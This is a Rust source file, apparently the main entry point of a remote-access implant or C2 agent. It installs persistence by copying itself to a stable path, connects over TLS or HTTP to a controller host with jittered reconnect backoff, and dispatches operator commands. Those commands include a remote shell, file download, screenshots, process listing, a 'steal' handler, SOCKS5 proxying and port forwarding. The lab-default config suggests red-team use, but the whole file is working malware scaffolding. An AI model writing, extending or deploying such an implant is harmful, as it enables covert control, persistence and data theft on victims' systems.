mod config;
mod transport;
mod checkin;
mod platform;
mod persistence;
mod dispatcher;
mod commands;
#[cfg(feature = "http-transport")] mod tunnel_client;

use commands::{shell, file_list, file_download, screenshot, process_list, persist_status, persist_remove, steal};
#[cfg(feature = "http-transport")]
use commands::{socks5, portfwd};
use oxide_shared::packet::Packet;
use rand::Rng;
use std::time::Duration;

const RECONNECT_BASE: f64 = 1.0;
const RECONNECT_MAX: f64 = 60.0;
const RECONNECT_JITTER: f64 = 0.25;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Install ring as the default rustls crypto provider. Required when both
    // reqwest (ring) and tokio-tungstenite (aws-lc-rs) pull different backends.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let config = config::Config::lab_default();

    let mut dispatch = dispatcher::Dispatcher::new();
    dispatch.register("shell", Box::new(shell::ShellHandler));
    dispatch.register("file_list", Box::new(file_list::FileListHandler));
    dispatch.register("file_download", Box::new(file_download::FileDownloadHandler));
    dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
    dispatch.register("process_list", Box::new(process_list::ProcessListHandler));
    dispatch.register("persist_status", Box::new(persist_status::PersistStatusHandler));
    dispatch.register("persist_remove", Box::new(persist_remove::PersistRemoveHandler));
    dispatch.register("steal", Box::new(steal::StealHandler));

    #[cfg(feature = "http-transport")]
    {
        dispatch.register("socks5_start",
            Box::new(socks5::Socks5StartHandler::new(config.clone())));
        dispatch.register("portfwd_add",
            Box::new(portfwd::PortFwdHandler::new(config.clone())));
    }

    let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
        eprintln!("[!] copy_to_stable: {e}");
        std::env::current_exe().unwrap_or_default()
    });

    let chain = persistence::get_chain();
    for r in &chain.install_first_available(&stable_path) {
        if r.installed {
            eprintln!("[+] Persistence installed: {}", r.name);
        } else {
            eprintln!("[!] Persistence failed ({}): {}", r.name, r.error.as_deref().unwrap_or("?"));
        }
    }

    let mut backoff = RECONNECT_BASE;
    loop {
        eprintln!("[*] Connecting to {}:{}...", config.host, config.port);

        #[cfg(feature = "http-transport")]
        let result = match transport::HttpTransport::connect(&config).await {
            Ok(mut t) => {
                eprintln!("[+] HTTP transport ready");
                backoff = RECONNECT_BASE;
                t.run(&dispatch, &chain).await
            }
            Err(e) => Err(e),
        };

        #[cfg(not(feature = "http-transport"))]
        let result = match transport::TlsTransport::connect(&config).await {
            Ok(mut t) => {
                eprintln!("[+] TLS handshake complete");
                backoff = RECONNECT_BASE;
                run_tls_session(&mut t, &dispatch, &chain).await
            }
            Err(e) => Err(e),
        };

        if let Err(e) = result { eprintln!("[!] Session ended: {e}"); }
        let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
        let delay = backoff * (1.0 + jitter);
        eprintln!("[*] Reconnecting in {delay:.1}s...");
        tokio::time::sleep(Duration::from_secs_f64(delay)).await;
        backoff = (backoff * 2.0).min(RECONNECT_MAX);
    }
}

async fn run_tls_session(
    transport: &mut transport::TlsTransport,
    dispatch: &dispatcher::Dispatcher,
    chain: &persistence::PersistenceChain,
) -> anyhow::Result<()> {
    let checkin_pkt = checkin::build_checkin_packet(&chain.check_all());
    transport.send(checkin_pkt).await?;

    let ack = transport.receive().await?;
    let session_id = ack.data["session_id"].as_str().unwrap_or("?");
    eprintln!("[+] Registered, session: {session_id}");

    loop {
        let packet = transport.receive().await?;
        match packet.packet_type.as_str() {
            "command" => { transport.send(dispatch.dispatch(&packet)).await?; }
            "heartbeat" => {
                transport.send(Packet::new("heartbeat", serde_json::json!({}))).await?;
            }
            other => eprintln!("[!] Unknown packet type: {other}"),
        }
    }
}
